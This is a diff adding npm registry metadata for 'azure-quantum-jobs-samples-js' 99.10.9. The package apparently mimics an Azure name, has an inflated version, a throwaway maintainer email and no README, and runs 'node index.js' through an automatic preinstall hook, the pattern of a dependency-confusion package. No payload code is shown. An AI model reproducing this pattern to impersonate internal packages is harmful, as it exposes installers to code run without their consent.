@@ -1,0 +1,62 @@
+{
+    "_id": "azure-quantum-jobs-samples-js",
+    "name": "azure-quantum-jobs-samples-js",
+    "dist-tags": {
+        "latest": "99.10.9"
+    },
+    "versions": {
+        "99.10.9": {
+            "name": "azure-quantum-jobs-samples-js",
+            "version": "99.10.9",
+            "description": "azure package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "azure-quantum-jobs-samples-js@99.10.9",
+            "_nodeVersion": "16.14.2",
+            "_npmVersion": "8.5.0",
+            "dist": {
+                "integrity": "sha512-CCVNzBonK+T06J0/NTEc57OpCvu7ZFgFNUNIhArkH1nJJQR+YbtUQOVZCJN7pYpyNvk+/7dEDVeZ2KWzitj4Og==",
+                "shasum": "f7e0a6dcd30e7c5bced0385656894071d3f31b89",
+                "tarball": "https://registry.npmjs.org/azure-quantum-jobs-samples-js/-/azure-quantum-jobs-samples-js-99.10.9.tgz",
+                "fileCount": 2,
+                "unpackedSize": 5081,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiOr72ACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmqwGRAAiHBa//CIDhVLlhho8gzdzvO4z/gPECWIXMgPJgruqueOKUbs\r\nNMvyosP99dcmUr83uoSpA3yDHmiqiYsZDGJFPXZPBDODog1Fgu3c5yz4/OPl\r\nG6+lOszkv94vSy4dhm/MKLcTzUIx2I3mKFBvQjMVYanipRun/4QoNYIHImpX\r\n9LbLuxDp1B+ax0XKdeZFIY0w5/N+J5q0dOZeZ8nTxMBm5T7R/Vn4S2dVB7J4\r\nqGRNX50JONWnTZrCjUc7N3whMlqXpYUkPVDSmumnCN6ZESCuseiSRoFcGPpf\r\n962TOHNodG9miM6easKRuDM9DITcgncPLl2kzYN8ZItH8tDYAYkKvxbeqSDb\r\nXmyjP76CUrIRPvBqaD12SeHnCyFySlZmTVxQNiKHYV1FRCG07AaX6PNDVCQP\r\n0m/EdpIwxVB1mNQSTNruOtgxtUYisrGoKbRNktXmEFzyqayWIMw/HQH4rlqE\r\nm75Wx22dK/dLx08YPPQhY/iAGeYwEwsDmYM0cf4PPQBjd5yS7JK4SmPaIJDe\r\nzWlhC8z3TopJCZl24F6Lqh8nk8aHJwCSEA3V3sVloL2gT1o/3Z/jRW28LeON\r\nBjD3XyKOvj8hjS7h6Jy7YuD0tXnJve9EV7ddGh9Cvs/LS/OKxd6jyNwntLCi\r\n/8p99uG22kjAlDGqK7FXSXxabUCTrWclcZA=\r\n=2E3u\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "1iydgbrf",
+                "email": "1iydgbrf@rt11.ml"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "1iydgbrf",
+                    "email": "1iydgbrf@rt11.ml"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/azure-quantum-jobs-samples-js_99.10.9_1648017142511_0.17387495073154713"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-23T06:32:22.511Z",
+        "99.10.9": "2022-03-23T06:32:22.675Z",
+        "modified": "2022-03-23T06:32:22.780Z"
+    },
+    "maintainers": [
+        {
+            "name": "1iydgbrf",
+            "email": "1iydgbrf@rt11.ml"
+        }
+    ],
+    "description": "azure package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
